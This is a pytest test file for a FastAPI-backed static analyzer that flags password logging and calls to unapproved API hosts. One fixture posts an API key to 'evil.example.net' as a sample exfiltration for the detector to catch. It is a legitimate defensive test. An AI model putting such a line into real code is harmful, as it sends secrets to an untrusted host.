import os
import sys

import pytest
from fastapi.testclient import TestClient

BACKEND_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'backend'))
if BACKEND_ROOT not in sys.path:
    sys.path.insert(0, BACKEND_ROOT)

from app.analyzer import analyze_python_source
from app.database import Base, engine
from main import app


@pytest.fixture(autouse=True)
def reset_database():
    Base.metadata.drop_all(bind=engine)
    Base.metadata.create_all(bind=engine)


client = TestClient(app)


def test_ast_parsing_and_alias_propagation():
    source = '''def login(request):
    password = request.get("password")
    attempted_value = password
    logger.info("Login attempt: %s", attempted_value)
'''
    result = analyze_python_source(source, 'demo.py', approved_destinations=['api.example.com'])

    assert result['ok'] is True
    assert len(result['findings']) == 1
    finding = result['findings'][0]
    assert finding['policy_name'] == 'no-password-logging'
    assert 'request.get("password")' in finding['intermediate_path']
    assert 'password' in finding['intermediate_path']
    assert 'attempted_value' in finding['intermediate_path']
    assert 'logger.info' in finding['intermediate_path']


def test_compliant_case_has_no_findings():
    source = '''def login(request):
    username = request.get("username")
    logger.info("Login attempt: %s", username)
'''
    result = analyze_python_source(source, 'demo.py', approved_destinations=['api.example.com'])
    assert result['findings'] == []


def test_unapproved_api_destination():
    source = '''
api_key = "abc123"
requests.post("https://evil.example.net/v1", json={"token": api_key})
'''
    result = analyze_python_source(source, 'example.py', approved_destinations=['api.example.com'])
    assert any(f['policy_name'] == 'approved-api-destination' for f in result['findings'])


def test_invalid_python_syntax_is_reported():
    result = analyze_python_source('def broken(:\n    pass\n')
    assert result['ok'] is False
    assert 'Syntax error' in result['error']['title']


def test_unsupported_flow_is_not_reported():
    source = '''
value = fetch_runtime_value()
logger.info("Runtime value: %s", value)
'''
    result = analyze_python_source(source, 'unsupported.py')
    assert result['findings'] == []


def test_api_validation_and_persistence():
    response = client.post('/api/projects', json={'name': ''})
    assert response.status_code in {400, 422}

    create = client.post('/api/projects', json={'name': 'TestProject', 'description': 'demo'})
    assert create.status_code == 200, create.text
    project_id = create.json()['id']

    analysis = client.post(
        f'/api/projects/{project_id}/analyze',
        json={
            'source_code': '''def login(request):\n    password = request.get("password")\n    attempted_value = password\n    logger.info("Login attempt: %s", attempted_value)\n''',
            'file_name': 'demo.py',
            'policies': ['no-password-logging'],
            'approved_destinations': ['api.example.com'],
        },
    )
    assert analysis.status_code == 200, analysis.text
    payload = analysis.json()
    assert payload['analysis_id']
    assert len(payload['findings']) >= 1

    history = client.get(f'/api/projects/{project_id}/analyses')
    assert history.status_code == 200
    assert len(history.json()['analyses']) == 1

    export = client.get(f"/api/analyses/{payload['analysis_id']}/report?format=json")
    assert export.status_code == 200
    report = export.json()
    assert 'findings' in report
    assert 'graph' in report
    assert report['findings']
